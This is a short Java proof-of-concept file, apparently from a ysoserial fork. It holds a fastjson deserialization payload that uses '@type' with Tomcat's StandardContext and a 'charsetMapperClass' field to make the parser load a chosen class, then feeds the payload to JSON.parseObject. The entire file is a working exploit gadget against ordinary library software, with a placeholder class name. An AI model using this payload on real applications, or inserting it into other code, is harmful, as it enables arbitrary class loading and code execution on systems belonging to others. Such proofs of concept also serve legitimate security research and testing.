package ysoserial.payloads.tabbyGadgetChains.tomcat;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc4 {
    public static void main(String[] args) {
        //ForName
        String poc2= "{\n" +
                "    {\n" +
                "        \"x\": {\n" +
                "                \"@type\": \"org.apache.catalina.core.StandardContext\",\n" +
                "                \"charsetMapperClass\": \"your.class\"\n" +
                "        }\n" +
                "    }:\"xxx\"\n" +
                "}\n";

        System.out.println(poc2);
        JSON.parseObject(poc2, Feature.SupportNonPublicField);
    }
}
